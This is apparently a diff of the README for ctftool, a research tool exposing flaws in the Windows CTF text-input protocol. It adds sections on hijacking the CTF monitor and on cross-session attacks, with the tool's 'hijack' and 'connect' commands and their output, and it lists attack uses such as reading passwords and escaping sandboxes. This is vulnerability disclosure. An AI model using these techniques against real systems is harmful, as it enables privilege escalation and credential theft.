@@ -235,23 +235,100 @@ Privilege Isolation*.
 CTF breaks these assumptions, and allows unprivileged processes to send input
 to privileged processes.
 
-Their are some requirements for this attack to work, as far as I'm aware it
-will only work if you have a display language installed that uses an OOP TIP,
-*out-of-process text input processor*. Users that speak languages that use IMEs 
-(Chinese, Japanese, Korean, and so on) and users with a11y tools likely fall
-into this category.
+There are some requirements for this attack to work, as far as I'm aware it
+will only work if you have a display language installed that uses an OoP TIP,
+*out-of-process text input processor*. Users with input languages that use IMEs 
+(Chinese, Japanese, Korean, and so on) and users with a11y tools fall into this
+category.
 
 Example attacks include...
 
  * Sending commands to an elevated command window.
- * Reading passwords out of dialogs.
- * Escaping sandboxes by sending input to unsandboxed windows.
+ * Reading passwords out of dialogs or the login screen.
+ * Escaping IL/AppContainer sandboxes by sending input to unsandboxed windows.
 
 There is an example [script](scripts/ctf-demo-editsession.ctf) in the scripts
 directory that will send input to a notepad window to demonstrate how edit
 sessions work.
 
 [![Edit Session Screenshot](docs/edit-thumb.png)](docs/edit-session-full.png)
+
+## Monitor Hijacking
+
+Because there is no authentication involved between clients and servers in the
+CTF protocol, an attacker with the necessary privileges to write to
+`\BaseNamedObjects` can create the CTF ALPC port and pretend to be the monitor.
+
+This allows any and all restrictions enforced by the monitor to be bypassed.
+
+If you want to experiment with this attack, try the `hijack` command in `ctftool`.
+
+```
+An interactive ctf exploration tool by @taviso.
+Type "help" for available commands.
+ctf> hijack Default 1
+NtAlpcCreatePort("\BaseNamedObjects\msctf.serverDefault1") => 0 00000218
+NtAlpcSendWaitReceivePort("\BaseNamedObjects\msctf.serverDefault1") => 0 00000218
+000000: 18 00 30 00 0a 20 00 00 00 11 00 00 44 11 00 00  ..0.. ......D...
+000010: a4 86 00 00 b7 66 b8 00 00 11 00 00 44 11 00 00  .....f......D...
+000020: e7 12 01 00 0c 00 00 00 80 01 02 00 20 10 d6 05  ............ ...
+A a message received
+        ProcessID: 4352, SearchUI.exe
+        ThreadId: 4420
+        WindowID: 00020180
+NtAlpcSendWaitReceivePort("\BaseNamedObjects\msctf.serverDefault1") => 0 00000218
+000000: 18 00 30 00 0a 20 00 00 ac 0f 00 00 0c 03 00 00  ..0.. ..........
+000010: ec 79 00 00 fa 66 b8 00 ac 0f 00 00 0c 03 00 00  .y...f..........
+000020: 12 04 01 00 08 00 00 00 10 01 01 00 00 00 00 00  ................
+A a message received
+        ProcessID: 4012, explorer.exe
+        ThreadId: 780
+        WindowID: 00010110
+NtAlpcSendWaitReceivePort("\BaseNamedObjects\msctf.serverDefault1") => 0 00000218
+000000: 18 00 30 00 0a 20 00 00 ac 0f 00 00 0c 03 00 00  ..0.. ..........
+000010: fc 8a 00 00 2a 67 b8 00 ac 0f 00 00 0c 03 00 00  ....*g..........
+000020: 12 04 01 00 08 00 00 00 10 01 01 00 58 00 00 00  ............X...
+A a message received
+        ProcessID: 4012, explorer.exe
+        ThreadId: 780
+...
+```
+
+## Cross Session Attacks
+
+There is no session isolation in the CTF protocol, any process can connect to
+any CTF server. For example, a Terminal Services user can interact with the
+processes of any other user, even the Administrator.
+
+The `connect` command in `ctftool` supports connecting to non-default sessions
+if you want to experiment with this attack.
+
+```
+An interactive ctf exploration tool by @taviso.
+Type "help" for available commands.
+Most commands require a connection, see "help connect".
+ctf> help connect
+Connect to CTF ALPC Port.
+
+Usage: connect [DESKTOPNAME SESSIONID]
+Without any parameters, connect to the ctf monitor for the current
+desktop and session. All subsequent commands will use this connection
+for communicating with the ctf monitor.
+
+If a connection is already open, the existing connection is closed first.
+
+If DESKTOPNAME and SESSIONID are specified, a connection to ctf monitor
+for another desktop and session are opened, if it exists.
+If the specified port does not exist, wait until it does exist. This is
+so that you can wait for a session that hasn't started
+yet in a script.
+Examples
+ Connect to the monitor for current desktop
+  ctf> connect
+ Connect to a specific desktop and session.
+  ctf> connect Default 1
+Most commands require a connection, see "help connect".
+```
 
 ## Status
 
